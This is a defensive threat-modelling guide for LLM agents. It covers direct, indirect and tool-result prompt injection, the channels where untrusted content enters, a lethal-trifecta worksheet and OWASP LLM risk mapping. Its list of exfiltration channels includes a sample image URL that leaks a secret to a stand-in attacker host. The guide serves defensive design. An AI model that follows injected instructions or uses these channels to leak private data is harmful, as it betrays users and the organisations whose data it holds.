# Threat model for LLM agents

The question is never "can the model be tricked?" (yes) but "what can a tricked model
reach?". Tool calls inherit every permission the agent holds.

- **Direct injection / jailbreak:** the user is the attacker. Matters when the user
  shouldn't be able to do everything the agent can (shared agents, other users' data,
  org-level credentials). Real attempts read like normal requests wrapped in authority,
  urgency and noble framing — not enumerable by keyword (tactics: `red-teaming.md`).
- **Indirect injection:** instructions planted in content the agent reads; the user is
  the victim.
- **Tool-result injection:** any third-party-writable field (issue titles, commit messages,
  invite bodies, reviews, file names, API error strings) arrives as a trusted-looking result.

## Where untrusted content enters

| Channel | Trust |
|---|---|
| User message | Trusted for that user's intent only |
| Retrieved docs, web, email, PDFs, images | Untrusted — hidden text, alt text, OCR'd text count |
| Tool / API results | Trust of the least-trusted writer of any returned field |
| MCP tool descriptions | Untrusted — descriptions are prompts and can change after approval |
| Memory, notes, scratchpads | Untrusted if anything untrusted ever wrote to them; persists across sessions |
| Other agents' outputs | Lowest trust of anything that agent read |
| Repo content (README, AGENTS.md, configs) | Untrusted for third-party repos; coding agents load them automatically |

## Exfiltration channels

Each is an exfil leg:

- Markdown/HTML images rendered by the client with data in the URL
  (`attacker.example/p?d=<secret>`) — zero-click.
- Links the user may click; auto-fetched link previews/unfurls.
- Fetch/browse tools with model-chosen URLs or query strings; search queries.
- Send email/message, post comment, open issue or PR (especially public repos).
- Writes to shared docs, tickets, wikis, spreadsheets.
- HTTP/webhook tools with model-chosen URLs; DNS lookups and package installs from a sandbox.
- Arguments to third-party APIs; logs or errors shipped to third parties.

## Lethal-trifecta worksheet

One row per context window (each agent and subagent) plus one for the system:

```markdown
| Context | Private data (source) | Untrusted content (source) | Exfil channel (sink) | Verdict |
|---|---|---|---|---|
| triage-agent | CRM records | inbound email | none (no send, links stripped) | OK |
| research-subagent | none | web pages | web fetch | OK alone |
| system | CRM (triage) | web (research → triage, free text) | reply email (triage) | FAIL |
```

- **Legs combine across tools and MCP servers** — the usual accidental assembly: one server
  reads private data, another fetches the web.
- **Across agents:** a subagent returning free text from untrusted content to an agent
  holding private data and a sink fails the system row.
- **Across time:** memory carries untrusted content into later sessions.
- **Two legs is a warning.** Record it; the next tool may complete the set.

## Beyond exfiltration

Separately check **untrusted content + any high-risk tool**:

- Destructive actions and fraud (delete, force-push, refund, transfer, purchase).
- Privilege/config changes (grant access, edit CI, rotate keys).
- Persistence: writes to memory, instruction files or prompts future runs load.
- Propagation: injected text written where other agents or users read it.
- Manipulation: biased summaries the user acts on.
- Denial of wallet: induced loops or huge tool outputs (LLM10: turn, token, spend caps).

Also check, by OWASP LLM ID (use the ID in threat notes):

- **LLM02** another tenant's records or a secret in output → scope in the data layer, no
  secrets in context. **LLM08** cross-tenant retrieval → per-tenant filters enforced by the
  store.
- **LLM03** malicious MCP server, skill, model or package → pin, review, sandbox.
  **LLM04** edited wiki page or memory poisons RAG → control corpus writers, provenance.
- **LLM05** model text reaching SQL, shell, HTML or URLs → parameterise, encode, validate.
- **LLM07** assume the system prompt is public: no keys or authz logic in it.

## Writing threat notes

One risk row (in `design.md` if the project uses `agent-engineering/`) per **source → sink
path**, not per category:

- **Risk:** OWASP ID + path, e.g. `LLM01: ticket body → close_ticket`.
- **Likelihood:** who can write to the source — internet = high; authenticated employees =
  medium; only the agent's own code = low.
- **Impact:** worst sink reachable from that source.
- **Mitigation:** the control *and where it is enforced* (code, infra, human). A prompt
  instruction is at most a layer.
- **Residual risk:** what still gets through, and who accepted it.
